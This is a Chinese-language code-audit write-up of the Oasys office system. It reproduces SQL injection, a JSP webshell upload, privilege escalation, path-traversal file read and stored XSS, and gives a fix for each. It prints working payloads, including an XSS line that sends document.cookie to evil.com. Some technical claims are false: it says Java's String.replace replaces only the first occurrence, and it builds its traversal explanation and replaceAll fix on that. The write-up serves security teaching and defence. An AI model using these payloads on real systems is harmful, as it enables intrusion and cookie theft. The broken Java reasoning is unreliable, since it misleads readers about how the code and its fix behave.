---
title: Oasys 系统代码审计案例：MyBatis ${} SQL注入、Fastjson 仅序列化无反序列化、无后缀校验任意文件上传、拦截器逻辑缺陷导致垂直越权、双写绕过任意文件读取、无过滤存储型
  XSS 等多漏洞实战复现
description: 基于 Oasys 开源办公系统的代码审计实战记录，系统复现 MyBatis ${} 导致 SQL 注入、Fastjson 仅用于序列化无反序列化风险、文件上传缺失后缀校验
  Getshell、拦截器鉴权逻辑缺陷造成垂直越权、路径替换逻辑缺陷导致双写绕过任意文件读取、全局无 XSS 过滤引发存储型 XSS 等六类漏洞的挖掘与利用全链路。
category: program-analysis
tags:
- Oasys
- 代码审计
- MyBatis
- SQL注入
- Fastjson
- 文件上传
- 垂直越权
- 任意文件读取
- 存储型XSS
- Java安全
- Spring Boot
date: 2024-01-15
updated: '2026-11-15'
---

## 环境搭建与初步分析

### 项目获取与依赖审计
- 从 GitHub 下载 Oasys 源码，导入 IDEA，配置 Maven 依赖、数据库脚本、修改 `application.yml` 数据库密码后启动。
- `pom.xml` 关键依赖排查：
  - `fastjson`（版本未标注，需确认是否存在反序列化利用链）
  - `commons-fileupload` / Spring Boot `MultipartFile`（文件上传组件）
  - MyBatis / MyBatis-Plus（映射层，重点关注 `${}` 与 `#{}` 使用差异）

### 代码结构概览
- Controller → Service → Mapper (XML) 分层典型。
- 拦截器 `HandlerInterceptor` 统一处理登录态校验、权限菜单匹配、IP 审计日志。

## 漏洞一：MyBatis `${}` 导致 SQL 注入（排序/搜索接口）

### 触发入口
- Controller：`InformController.informListPaging` 接收 `baseKey`、`type`、`status`、`time` 等参数，经 `setSomething` 非空校验后传入 Service。
- Service：`NoticeService.sortMyNotice(userId, baseKey, type, status, time)` 直接调用 Mapper。
- Mapper XML：`NoticeMapper.xml` 中 `sortMyNotice` 语句片段：

```xml
<if test="baseKey != null">
  and n.title LIKE '%${baseKey}%'
</if>
```

### 根因分析
- MyBatis `#{}` 为预编译参数化占位符，`${}` 为直接字符串拼接，**未做任何转义**，导致 `baseKey` 可闭合 `LIKE` 语句注入任意 SQL 片段。
- 同目录下另一 Mapper 文件同理存在相同模式。

### 复现步骤
1. 登录系统，抓包获取 `/inform/informListPaging` 请求（GET/POST 均可）。
2. `baseKey=1` 正常返回 8 条；`baseKey=1%' or 1=1 --` 返回 22 条（全表数据），确认注入。
3. 可进一步利用 `UNION SELECT`、`报错注入`、`布尔盲注`、`时间盲注`、`DNSLog 外带` 等技术提取数据。参考：[[ctfshow-web-sql-injection-bypass-basics]]、[[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]]。

### 修复建议
- 所有动态拼接场景改用 `#{}`；若必须动态拼接表名/列名/排序字段，需建立白名单校验。
- 参考防御体系：[[java-preparedstatement-sql-injection-defense]]。

## 漏洞二：Fastjson 仅用于序列化，无反序列化攻击面

### 代码排查
- 全局搜索 `JSON.parse`、`JSON.parseObject`、`JSON.parseArray`、`toJSONString` 等调用。
- 仅发现两处 `JSON.toJSONString(obj)` 序列化调用，**无任何 `parse` 类反序列化入口**。
- Controller 未开启 `@RequestBody` 自动反序列化为 Object 后再手动 parse，亦无自定义 `HttpMessageConverter` 注入 Fastjson 反序列化。

### 结论
- 版本虽可能较低，但**无反序列化触发点**，不构成漏洞。
- 若后续引入反序列化场景，需升级至 1.2.83+ 并开启 `safeMode`、配置 `autoType` 白名单。参考：[[xd-security-deserialization-xxe-notes-day37-39]]。

## 漏洞三：任意文件上传 Getshell（缺失后缀/内容校验）

### 接口定位
- 关键字 `file`、`upload`、`MultipartFile` 定位至 `CommonController.upload`。
- 代码逻辑：
  1. `file.getOriginalFilename()` 取原始文件名，`substring(lastIndexOf('.'))` 截取后缀。
  2. 新文件名 = `UUID + 后缀`。
  3. 先存 `tmp` 目录，再 `transferTo` 移至 `rootPath/attachment/`。
  4. **全程未校验后缀白名单、未校验 Content-Type、未校验文件头魔数、未禁用目录执行权限**。

### 复现 Getshell
1. 构造 JSP Webshell（如 `cmd.jsp` 内容 `Runtime.getRuntime().exec(request.getParameter("cmd"))`）。
2. 修改文件名为 `shell.jpg` 上传，Burp 修改 `filename="shell.jsp"` 或直接上传 `.jsp`。
3. 返回路径 `/attachment/uuid.jsp`，访问 `?cmd=whoami` 命令执行成功。
4. 实测需在 `pom.xml` 添加 `tomcat-embed-jasper` 依赖以支持 JSP 解析（Spring Boot 默认不解析 JSP）。

### 修复建议
- 后缀白名单（仅允许图片/文档）、MIME 校验、魔数校验、重命名去除扩展名、存储目录设为不可执行、使用对象存储/独立域名分发。参考：[[pikachu-target-writeup-part4]]、[[xd-security-pentest-basic-stage-notes]]（文件上传模块）。

## 漏洞四：拦截器鉴权逻辑缺陷导致垂直越权

### 拦截器核心代码
```java
// 1. 从 Session 获取 userId，查库拿用户对象
User user = userService.getById(sessionUserId);
// 2. 查询该用户拥有的菜单 URL 列表
List<String> menuUrls = menuService.getUrlsByUserId(user.getId());
// 3. 校验当前请求路径是否在菜单列表中
if (!menuUrls.contains(requestURI)) { return false; }
// 4. 其余：IP 白名单、审计日志记录
return true;
```

### 逻辑缺陷
- **菜单 URL 列表查询未按角色/权限过滤**，直接返回该用户**所有可访问菜单**（含管理员菜单）。
- 低权限用户登录后，Session 中 `userId` 为普通用户，但 `menuUrls` 因 SQL 编写错误（如 `JOIN` 缺失 `role_id` 条件）包含了 `/system/**` 等管理员路径。
- 校验逻辑 `menuUrls.contains(requestURI)` 因此对管理员接口**永远返回 true**。

### 复现垂直越权
1. 管理员账号访问 `/system/user/list` 抓包获取 Cookie。
2. 普通用户登录，替换 Cookie 中 `JSESSIONID` 或直接用普通用户 Cookie 访问 `/system/user/list` → **200 OK 返回用户列表**。
3. 同理可越权访问角色分配、日志审计、定时任务等所有后台管理功能。

### 修复建议
- 菜单查询必须**关联角色-权限表**，仅返回当前用户角色对应的权限 URL。
- 拦截器改为 **RBAC 细粒度校验**：`PermissionEvaluator` + `@PreAuthorize` 或 Shiro/Spring Security 标准体系。参考：[[xd-security-logic-vulnerability-notes-day33-36]]（垂直越权/IDOR 专题）。

## 漏洞五：路径替换逻辑缺陷导致双写绕过任意文件读取

### 接口与代码
- 全局搜索 `filepath`、`download`、`readFile` 定位至 `CommonController.fileDownload`。
- 核心逻辑：
```java
String rootPath = config.getRootPath(); // /opt/oasys/
String path = request.getParameter("filepath");
path = path.replace("/image", ""); // 仅替换一次
File file = new File(rootPath + path);
FileUtils.copyFile(file, response.getOutputStream());
```

### 绕过原理
- `String.replace(target, replacement)` **仅替换第一次出现**（Java 8 默认行为），而非全局替换。
- 攻击构造：`/image..//image..//image..//etc/passwd`
  - 第一次替换移除首个 `/image` → `..//image..//image..//etc/passwd`
  - 拼接后 `rootPath + ..//image..//image..//etc/passwd` 经规范化解析为 `/etc/passwd`。

### 复现读取敏感文件
1. `GET /common/download?filepath=/image..//image..//image..//etc/passwd` → 返回 `/etc/passwd` 内容。
2. 同理可读取 `application.yml`（数据库密码）、`id_rsa`、源码 `.class` 反编译等。

### 修复建议
- 使用 `path.replaceAll("/image", "")` 全局替换，或更稳妥地：**规范化路径后校验是否在允许目录前缀下**（`Path.normalize().startsWith(allowedRoot)`）。
- 禁用目录穿越序列 `..`，采用白名单映射表（`fileId -> 真实路径`）。参考：[[php-file-inclusion-vulnerability]]（目录穿越通用原理）、[[xd-security-file-inclusion-notes]]。

## 漏洞六：全局无 XSS 过滤导致存储型 XSS

### 攻击面排查
- 全局搜索 `@RequestMapping` 入口，重点关注富文本、公告、留言、个人信息等**持久化且前端回显**的字段。
- 无全局 `XSS Filter`（如 `HttpServletRequestWrapper` 过滤脚本标签）、无 `Content-Security-Policy` 响应头、前端渲染未使用 `v-html`/`dangerouslySetInnerHTML` 等危险 API 但**后端未转义**。

### 复现存储型 XSS
1. 编辑公告/个人签名，插入 `<img src=x onerror=alert(1)>` 或 `<svg/onload=fetch('//evil.com/?c='+document.cookie)>`。
2. 提交后，管理员/其他用户访问公告列表/详情页 → **脚本在受害者浏览器执行**，窃取 Cookie、键盘记录、发起 CSRF 等。
3. 同理，留言板、意见反馈、文件描述等所有富文本/长文本字段均可利用。

### 修复建议
- **输入端**：集成 `xss-protect`/`jsoup` 白名单过滤（保留安全标签/属性）。
- **输出端**：模板引擎开启自动转义（Thymeleaf 默认开启，Freemarker/Velocity 需配置），前端 React/Vue 避免 `dangerouslySetInnerHTML`。
- **响应头**：`Content-Security-Policy: default-src 'self'; script-src 'self'` 降低影响。参考：[[xd-security-xss-vulnerability-notes-day25-28]]、[[pikachu-target-writeup-part2-xss]]、[[websocket-vulnerabilities-analysis]]（XSS 变种）。

## 总结与知识图谱关联

| 漏洞类型 | 核心原因 | 关键修复点 | 交叉引用知识页 |
|---|---|---|---|
| MyBatis `${}` SQLi | 动态 SQL 拼接未参数化 | 全量替换为 `#{}`，动态表/列名白名单 | [[java-preparedstatement-sql-injection-defense]]、[[ctfshow-web-sql-injection-bypass-basics]] |
| Fastjson 反序列化 | 仅序列化无 parse 调用 | 若引入反序列化，升级版本+safeMode+autoType 白名单 | [[xd-security-deserialization-xxe-notes-day37-39]] |
| 任意文件上传 | 缺失后缀/MIME/魔数/执行权限校验 | 白名单+重命名+不可执行目录+对象存储 | [[pikachu-target-writeup-part4]]、[[xd-security-pentest-basic-stage-notes]] |
| 垂直越权 | 拦截器菜单查询缺失角色过滤 | RBAC 细粒度校验，菜单按角色关联权限 | [[xd-security-logic-vulnerability-notes-day33-36]] |
| 任意文件读取 | `replace` 单次替换导致双写绕过 | `replaceAll` 或路径规范化+前缀校验 | [[php-file-inclusion-vulnerability]]、[[xd-security-file-inclusion-notes]] |
| 存储型 XSS | 无全局过滤/转义/CSP | jsoup 白名单过滤+模板自动转义+CSP 头 | [[xd-security-xss-vulnerability-notes-day25-28]]、[[pikachu-target-writeup-part2-xss]] |

> 本页为代码审计实战复盘，旨在展示**从依赖排查、入口追踪、数据流分析到漏洞验证**的完整方法论，所有漏洞均在授权环境下复现，修复建议可直接落地至同类 Spring Boot + MyBatis 项目。

## 来源

- [0x6270安全团队-202203-202304_07](../sources/0x6270安全团队-202203-202304_07.md)
